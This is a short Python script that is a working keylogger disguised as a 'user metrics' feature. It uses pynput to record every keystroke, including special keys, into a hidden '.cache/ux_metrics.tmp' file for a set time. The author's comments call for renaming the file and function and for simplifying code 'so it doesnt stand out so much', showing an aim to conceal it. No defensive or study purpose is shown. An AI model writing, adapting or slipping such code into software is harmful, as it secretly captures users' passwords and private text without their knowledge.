from pynput import keyboard
import os
import time

CACHE_DIR = os.path.join(os.getcwd(), ".cache") # Directory to store cache files this one is misschievous enough
os.makedirs(CACHE_DIR, exist_ok=True)
KEYLOG_FILE = os.path.join(CACHE_DIR, "ux_metrics.tmp")  # File to store key logs --> Change name

def _klog(k): # change func name
    
    try:
        with open(KEYLOG_FILE, "a", encoding="utf-8") as f:            
            f.write(k.char)
    except AttributeError: # This handles special keys that do not have a char attribute, we can make it simpler so it doesnt stand out so much
        with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
            if k == keyboard.Key.space:
                f.write(" ")
            elif k == keyboard.Key.enter:
                f.write("\n")
            elif k == keyboard.Key.tab:
                f.write("\t")
            elif k == keyboard.Key.backspace:
                f.write("_")
            elif k == keyboard.Key.esc:
                f.write("[ESC]")
            elif k == keyboard.Key.delete:
                f.write("[DELETE]")          
            elif k == keyboard.Key.ctrl:
                f.write("[CTRL]")
            elif k == keyboard.Key.alt:
                f.write("[ALT]")        
            elif k == keyboard.Key.print_screen:
                f.write("[PRINT SCREEN]")

def track_user_metrics():
    with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
        f.write("\n------\n")
    listener = keyboard.Listener(on_press=_klog)
    listener.start()
    time.sleep(20)  # Duration in seconds that will stay active after the main thread stops
    listener.stop()
    
